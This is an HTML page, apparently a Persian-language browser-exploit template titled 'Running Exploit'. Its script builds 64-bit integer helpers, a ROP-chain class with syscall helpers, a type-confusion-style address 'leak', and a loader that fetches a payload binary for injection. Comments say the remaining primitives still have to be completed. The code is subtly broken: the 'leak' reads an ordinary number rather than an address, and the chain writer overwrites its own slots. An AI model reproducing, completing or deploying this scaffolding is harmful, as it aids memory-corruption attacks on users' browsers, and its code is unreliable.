    <h2>در حال اجرای Exploit...</h2>
    <script>
        // =======================
        // Int64 Class
        // =======================
        function Int64(v) {
            this.bytes = new Uint8Array(8);
            switch (typeof v) {
                case 'number':
                    v = '0x' + v.toString(16);
                case 'string':
                    if (v.startsWith('0x')) v = v.slice(2);
                    if (v.length % 2 == 1) v = '0' + v;
                    v = v.padStart(16, '0');
                    for (let i = 0; i < 8; i++)
                        this.bytes[7 - i] = parseInt(v.slice(i * 2, i * 2 + 2), 16);
                    break;
                case 'object':
                    if (v.length != 8) throw "Int64: invalid length";
                    this.bytes.set(v);
                    break;
                default:
                    throw "Int64: unsupported type";
            }
        }

        Int64.prototype.toString = function () {
            return '0x' + Array.from(this.bytes).map(b => b.toString(16).padStart(2, '0')).reverse().join('');
        };

        Int64.prototype.toInt32Array = function () {
            let arr = new Int32Array(2);
            arr[0] = this.bytes[0] | (this.bytes[1] << 8) | (this.bytes[2] << 16) | (this.bytes[3] << 24);
            arr[1] = this.bytes[4] | (this.bytes[5] << 8) | (this.bytes[6] << 16) | (this.bytes[7] << 24);
            return arr;
        };

        Int64.prototype.add = function (v) {
            let result = new Uint8Array(8);
            let carry = 0;
            for (let i = 0; i < 8; i++) {
                let sum = this.bytes[i] + v.bytes[i] + carry;
                result[i] = sum & 0xff;
                carry = sum >> 8;
            }
            return new Int64(result);
        };

        Int64.prototype.sub = function (v) {
            let result = new Uint8Array(8);
            let borrow = 0;
            for (let i = 0; i < 8; i++) {
                let diff = this.bytes[i] - v.bytes[i] - borrow;
                if (diff < 0) {
                    diff += 256;
                    borrow = 1;
                } else {
                    borrow = 0;
                }
                result[i] = diff;
            }
            return new Int64(result);
        };

        // =======================
        // ROP Class
        // =======================
        function rop(start) {
            this.chain = [];
            this.count = 0;
            this.start = start;
        }

        rop.prototype.push = function (val) {
            this.chain.push(val);
            this.count += 1;
        };

        rop.prototype.fcall = function (func, args) {
            this.push(func);
            for (let i = 0; i < args.length; i++) {
                this.push(args[i]);
            }
        };

        rop.prototype.syscall = function (num, args) {
            this.fcall(new Int64(num), args);
        };

        rop.prototype.write_result = function (addr) {
            for (let i = 0; i < this.chain.length; i++) {
                addr[i] = this.chain[i].toInt32Array()[0];
                addr[i + 1] = this.chain[i].toInt32Array()[1];
            }
        };

        rop.prototype.jmp_rsp = function () {
            return this.chain[this.chain.length - 1];
        };

        // =======================
        // Exploit Core (PoC)
        // =======================
        function poc() {
            let ab = new ArrayBuffer(0x100);
            let f64 = new Float64Array(ab);
            let u32 = new Uint32Array(ab);

            function f2i(f) {
                f64[0] = f;
                return new Int64(u32);
            }

            function i2f(i) {
                u32.set(i.toInt32Array());
                return f64[0];
            }

            let obj = { marker: 0x41414141 };
            let leak = f2i(obj.marker);
            console.log("Leaked address: " + leak.toString());

            // ادامه‌ی ساخت fake object و primitives
            // این قسمت باید با توجه به هدف exploit کامل بشه
        }

        // =======================
        // External Payload Loader
        // =======================
        async function injectPayload() {
            try {
                const response = await fetch("payload.bin");
                const buffer = await response.arrayBuffer();
                const bytes = new Uint8Array(buffer);
                console.log("Payload loaded:", bytes.length, "bytes");

                // اینجا باید با write primitive واقعی تزریق بشه
            } catch (err) {
                console.error("خطا در بارگذاری payload:", err);
            }
        }

        // اجرای PoC و بارگذاری payload
        poc();
        injectPayload();

        // =======================
        // امضا
        // =======================
        console.log("گردآورنده : محمودی");
    </script>
